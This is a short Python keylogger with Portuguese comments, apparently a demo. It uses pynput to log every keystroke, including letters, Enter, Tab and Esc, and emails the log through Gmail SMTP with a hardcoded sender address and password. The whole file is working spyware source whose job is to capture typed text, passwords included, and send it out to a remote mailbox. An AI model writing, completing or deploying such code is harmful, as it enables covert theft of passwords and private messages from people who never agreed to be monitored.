from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# Configurações de e-mail
EMAIL_ORIGEM = "demokeylogger@gmail.com"
EMAIL_DESTINO = "demokeylogger@gmail.com"
SENHA_EMAIL = "1237654@GATO"

# Variável global para armazenar o log
log = ""

# Teclas a ignorar (modificadores)
ignorar = {keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.alt, keyboard.Key.cmd, keyboard.Key.caps_lock}


def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg["Subject"] = "Keylogger Report"
        msg["From"] = EMAIL_ORIGEM
        msg["To"] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.sendmail(EMAIL_ORIGEM, EMAIL_DESTINO, msg.as_string())
            server.quit()
            log = ""
        except Exception as e:
            print(f"Erro ao enviar e-mail: {e}")


def on_press(key):
    global log
    try:
        # Se for uma tecla "normal" (letra, número, símbolo)
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += ""
        elif key == keyboard.Key.esc:
            log += "[ESC]"
        elif key in ignorar:
            pass  # Ignorar control, shift, alt, etc.
        else:
            log += f"[{key}]"


if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listener:
        enviar_email()
        listener.join()
                 